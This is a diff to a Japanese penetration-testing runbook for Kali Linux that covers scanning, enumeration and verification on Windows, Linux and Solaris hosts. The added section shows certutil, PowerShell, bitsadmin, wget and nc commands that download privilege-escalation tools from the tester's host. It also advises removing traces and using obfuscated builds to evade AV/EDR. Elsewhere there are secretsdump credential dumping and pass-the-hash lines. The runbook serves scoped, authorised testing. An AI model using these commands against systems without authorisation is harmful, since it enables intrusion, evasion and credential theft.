@@ -1,16 +1,16 @@
 # 脆弱性調査 実施要領
 
-- 調査端末: Kali Linux (root)
+- 実行端末: Kali Linux
 - 対象OS: Windows 7-11 / Server, Linux, RHEL, Solaris
 - スコープ前提: **AD(ドメイン)除外** / 外部(未認証)・内部(credentialed)を分離
-- 記録: Excel(findings トラッカ)+ Obsidian(再現手順の一次ソース)
-- ツールベース: `/home/kali/Desktop/Tool/`(`winset/`, `linset/`, `ligolo/`)、impacket は `~/venvs/pentest/bin/` 優先
+- 記録: 表計算ベースの調査結果
 - 共通変数(以降で使用):
 
 ```bash
 T=10.10.10.10                                  # 対象ホスト
 RANGE=10.10.10.0/24                            # 対象レンジ
-LH=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)   # LHOST(動的)
+IFACE=eth0                                     # 内部スキャン用IF(環境に合わせ変更)
+LH=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)   # LHOST(VPN tun0 から動的取得)
 ```
 
 ---
@@ -96,20 +96,30 @@ sudo gvm-check-setup
 sudo gvm-start        # https://127.0.0.1:9392
 ```
 
-### (3) 未パッケージ(手動導入)
+### (3) 未パッケージ(手動ダウンロード→導入)
+
+git clone は使わず、ソースアーカイブまたは単一スクリプトを取得して導入する。作業はカレントディレクトリで実施。
 
 ```bash
-# nmap-vulners(NSE)
-sudo git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/nmap-vulners
+# nmap-vulners(NSE): ソースアーカイブを取得して展開
+wget https://github.com/vulnersCom/nmap-vulners/archive/refs/heads/master.tar.gz -O nmap-vulners.tar.gz
+sudo tar xf nmap-vulners.tar.gz -C /usr/share/nmap/scripts/
+sudo mv /usr/share/nmap/scripts/nmap-vulners-master /usr/share/nmap/scripts/nmap-vulners
 sudo nmap --script-updatedb
 
-# pipx 系
-pipx install git-dumper          # git-dumper
-pipx install man-spider          # MANSPIDER(コマンド manspider)
-pipx install wesng               # WES-NG(コマンド wes)
+# linux-exploit-suggester(単一スクリプト)
+wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+chmod +x les.sh
 
-# linux-exploit-suggester(git)
-git clone https://github.com/The-Z-Labs/linux-exploit-suggester ~/Desktop/Tool/linset/les
+# WES-NG(単一スクリプト + 定義DB)
+wget https://raw.githubusercontent.com/bitsadmin/wesng/master/wes.py -O wes.py
+python3 wes.py --update          # definitions 取得
+
+# git-dumper / MANSPIDER(ソースアーカイブ → pip でインストール)
+wget https://github.com/arthaud/git-dumper/archive/refs/heads/master.tar.gz -O git-dumper.tar.gz
+tar xf git-dumper.tar.gz && pip install ./git-dumper-master --break-system-packages
+wget https://github.com/blacklanternsecurity/MANSPIDER/archive/refs/heads/master.tar.gz -O manspider.tar.gz
+tar xf manspider.tar.gz && pip install ./MANSPIDER-master --break-system-packages
 ```
 
 ### 導入確認
@@ -117,7 +127,7 @@ git clone https://github.com/The-Z-Labs/linux-exploit-suggester ~/Desktop/Tool/l
 ```bash
 for t in nmap nuclei feroxbuster nxc ffuf gobuster nikto sslscan testssl.sh \
   hydra msfconsole searchsploit smbmap onesixtyone snmpwalk odat chisel \
-  linpeas winpeas ligolo-proxy git-dumper manspider wes; do
+  linpeas winpeas ligolo-proxy git-dumper manspider; do
   command -v "$t" >/dev/null && echo "OK  $t" || echo "--  $t (未導入)"; done
 ```
 
@@ -126,11 +136,11 @@ for t in nmap nuclei feroxbuster nxc ffuf gobuster nikto sslscan testssl.sh \
 ## Phase 0: 準備・記録
 
 ```bash
-mkdir -p ~/eng/{scope,scans,web,loot,report} && cd ~/eng/scans
+mkdir -p ~/assessment/{scope,scans,web,loot,report} && cd ~/assessment/scans
 printf '%s\n' "$RANGE" > ../scope/targets.txt   # RoE 承認済みレンジのみ
 
 # 全コマンド出力を保全(再現性確保)
-script -q -a ~/eng/session_$(date +%F).log
+script -q -a ~/assessment/session_$(date +%F).log
 # もしくは tmux + tmux-logging プラグインで pane を自動ログ
 ```
 
@@ -146,12 +156,12 @@ nmap -sn -PE -PS22,80,443,445,3389 -PA80 -iL ../scope/targets.txt -oA discovery
 grep Up discovery.gnmap | awk '{print $2}' > live.txt
 
 # IPv6(デュアルスタックホストの取りこぼし防止)
-nmap -6 -sn fe80::/64 -e eth1 -oA discovery6      # 内部リンクローカル
+nmap -6 -sn fe80::/64 -e "$IFACE" -oA discovery6  # 内部リンクローカル
 # 既知のIPv6レンジがあれば対象指定
 
 # L2 発見(内部・FW有効でICMP/TCPに応答しないホスト)
-sudo arp-scan -I eth1 --localnet
-sudo netdiscover -i eth1 -r "$RANGE"
+sudo arp-scan -I "$IFACE" --localnet
+sudo netdiscover -i "$IFACE" -r "$RANGE"
 
 # 広域ポートスイープ(高速)
 sudo masscan -p1-65535 --rate 1000 -iL live.txt -oG masscan.gnmap
@@ -182,9 +192,7 @@ sudo nmap -sU -p53,69,123,137,161,500,1434 -sV -oA udp_key_$T $T
 ## Phase 3: 既知脆弱性 NSE + 統合スキャナ
 
 ```bash
-# vulners NSE 導入(初回のみ)
-sudo git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/nmap-vulners
-sudo nmap --script-updatedb
+# vulners NSE は環境構築節(3)で導入済み
 
 # 既知脆弱性スクリプト
 sudo nmap -sV --script "vuln or vulners" -oA nse_$T $T
@@ -309,7 +317,7 @@ ldapsearch -x -H ldap://$T -b "dc=target,dc=tld"
 
 ```bash
 # MSSQL
-nxc mssql $T -u sa -p 'pass'                       # PowerUpSQL は winset/ に同梱
+nxc mssql $T -u sa -p 'pass'                       # 認証情報があれば列挙
 # MySQL / PostgreSQL
 mysql -h $T -u root -p ; nmap -p3306 --script mysql-* $T
 psql -h $T -U postgres ; nmap -p5432 --script pgsql-brute $T
@@ -359,19 +367,80 @@ iLO/iDRAC/プリンタ/ネットワーク機器のベンダ既定資格情報を
 
 ---
 
+## 対象マシンへのツール配送
+
+winPEAS / linPEAS / unix-privesc-check 等を認証済みの対象へ送り込む手順。Kali 側で一時配信し、対象から取得するのが基本。送付後は痕跡を消す。
+
+### Kali 側(配信)
+
+```bash
+# HTTP 配信(カレントを公開)
+sudo python3 -m http.server 80
+# SMB 配信(Windows 取得用、impacket-scripts 同梱)
+impacket-smbserver share "$(pwd)" -smb2support
+# SSH/SCP 取得用に sshd を起動
+sudo systemctl start ssh
+```
+
+### Windows 対象(取得)
+
+```cmd
+:: certutil
+certutil -urlcache -split -f http://<KALI>/winPEASx64.exe winPEAS.exe
+:: PowerShell
+powershell -c "Invoke-WebRequest http://<KALI>/winPEASx64.exe -OutFile winPEAS.exe"
+:: bitsadmin
+bitsadmin /transfer j http://<KALI>/winPEASx64.exe %cd%\winPEAS.exe
+:: SMB から直接
+copy \\<KALI>\share\winPEASx64.exe .
+```
+
+### Linux / RHEL 対象(取得)
+
+```bash
+wget http://<KALI>/linpeas.sh -O /tmp/linpeas.sh   # または curl -o
+curl -O http://<KALI>/les.sh
+scp user@<KALI>:/path/linpeas.sh .                  # SSH 経由
+```
+
+### Solaris 対象(取得・注意)
+
+```sh
+# certutil/PowerShell は無い。OpenSSH があれば scp/sftp が確実:
+sftp user@<KALI>                                    # get /path/unix-privesc-check
+# wget が無い旧 Solaris は /usr/sfw/bin/wget か ftp を使用:
+/usr/sfw/bin/wget http://<KALI>/unix-privesc-check
+ftp <KALI>                                          # get <file>
+```
+
+シェルスクリプト(linpeas.sh / unix-privesc-check)はアーキ非依存。コンパイル済みバイナリ(winPEAS, les バイナリ等)は対象アーキ(x86/x64/SPARC)に合わせて選択。
+
+### ネットワーク制限時の代替
+
+```bash
+# nc 転送(Kali=送信側)
+nc -lvnp 4444 < winPEASx64.exe        # 対象: nc <KALI> 4444 > winPEAS.exe
+# base64 で貼り付け(対話シェルのみのとき)
+base64 -w0 linpeas.sh                  # 対象で: echo '<b64>' | base64 -d > linpeas.sh
+```
+
+AV/EDR は winPEAS 等を検知しうる。難読化版(`*_ofs.exe`)の利用、実行後の即時削除、可能なら既存の暗号化チャネル経由を優先。
+
+---
+
 ## Phase 8: OS別ローカル列挙(認証後)
 
 ### Windows(7-11 / Server・スタンドアロン)
 
 ```powershell
-# /home/kali/Desktop/Tool/winset/ から対象へ配布して実行
+# 対象へ配送後に実行(配送要領は上節)
 .\winPEASx64.exe quiet cmd
 powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
 ```
 
 ```bash
 # 欠落パッチ → CVE(Kali側で解析)
-wes.py systeminfo.txt
+python3 wes.py systeminfo.txt
 # ホストレベル脆弱性の確認(AD非依存)
 nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption $T   # BlueKeep/CVE-2019-0708・NLA有無
 nmap -p445 --script smb-vuln-ms17-010 $T                    # EternalBlue
@@ -385,7 +454,7 @@ nmap -p445 --script smb-vuln-ms17-010 $T                    # EternalBlue
 ### Linux / RHEL
 
 ```bash
-# /home/kali/Desktop/Tool/linset/ から配布
+# 対象へ配送後に実行(配送要領は上節)
 ./linpeas.sh -a | tee linpeas_$T.txt
 ./les.sh                                          # linux-exploit-suggester
 # RHEL は backport によりバナー版数≠脆弱。実装版で照合:
@@ -429,7 +498,7 @@ ls -la /var/spool/cron/crontabs /etc/cron* 2>/dev/null
 nxc smb ../scope/live.txt -u Administrator -H <NTLM> --local-auth --continue-on-success
 nxc smb ../scope/live.txt -u Administrator -p 'pass' --local-auth
 # 必要に応じてピボット(スコープ内)
-# ligolo-ng(~/Desktop/Tool/ligolo/)/ chisel / sshuttle
+# ligolo-ng / chisel / sshuttle(スコープ内のみ)
 ```
 
 - NetExec https://github.com/Pennyw0rth/NetExec
@@ -446,7 +515,7 @@ searchsploit "openssh 7.2"
 # 非破壊検証
 msfconsole -q -x "use <module>; set RHOSTS $T; set LHOST $LH; check; exit"
 # impacket(認証後の確認)
-~/venvs/pentest/bin/secretsdump.py './Administrator:pass'@$T
+impacket-secretsdump './Administrator:pass'@$T
 ```
 
 CVSS に加え CISA KEV(実際に悪用中)と EPSS(悪用確率)を相関させ是正優先度を実態化。誤検知は必ず手動/`check`/`rpm -qa` で裏取りしてから所見化。
@@ -461,9 +530,9 @@ CVSS に加え CISA KEV(実際に悪用中)と EPSS(悪用確率)を相関させ
 
 ## Phase 11: 記録
 
-- 所見の一覧・トリアージ・進捗: Excel findings トラッカ(CVSS入力→深刻度自動判定、系統/OSフィルタ)
-- 再現手順の一次ソース: Obsidian(Markdown、コマンド+出力を保全)
-- 系統(Windows/Linux/RHEL/Solaris)は Findings シートの「系統/OS」列でフィルタ・集計
+- 所見の一覧・トリアージ・進捗: 表計算ベースの所見トラッカ(CVSS入力→深刻度自動判定、系統/OSフィルタ)
+- 再現手順の一次ソース: Markdown ノート(コマンド+出力を保全)
+- 系統(Windows/Linux/RHEL/Solaris)はトラッカの「系統/OS」列でフィルタ・集計
 
 ---
 
